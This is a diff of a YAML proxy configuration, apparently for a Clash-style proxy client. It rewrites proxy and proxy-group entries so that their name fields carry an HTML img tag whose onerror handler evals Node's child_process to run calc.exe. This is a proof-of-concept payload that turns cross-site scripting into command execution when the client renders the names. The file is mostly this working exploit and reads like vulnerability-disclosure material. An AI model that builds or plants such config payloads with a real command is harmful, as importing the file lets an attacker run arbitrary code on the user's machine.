@@ -40,20 +40,23 @@ mode: Rule
 log-level: info
 external-controller: :9090
 proxies:
-name: atype: socks5
-server: 127.0.0.1
-port: "17938"
-skip-cert-verify: true
-name: abc
-type: socks5
-server: 127.0.0.1
-port: "8088"
-skip-cert-verify: true
+  - name: a<img/src="1"/onerror=eval(`require("child_process").exec("calc.exe");`);>
+    type: socks5
+    server: 127.0.0.1
+    port: "17938"
+    skip-cert-verify: true
+  - name: abc
+    type: socks5
+    server: 127.0.0.1
+    port: "8088"
+    skip-cert-verify: true
+
 proxy-groups:
-name: <img/src="1"/onerror=eval(`require("child_process").exec("calc.exe");`);>
-type: select
-proxies:
-- a<img/src="1"/onerror=eval(`require("child_process").exec("calc.exe");`);>
+  -
+    name: <img/src="1"/onerror=eval(`require("child_process").exec("calc.exe");`);>
+    type: select
+    proxies:
+    - a<img/src="1"/onerror=eval(`require("child_process").exec("calc.exe");`);>
 
 ```
 
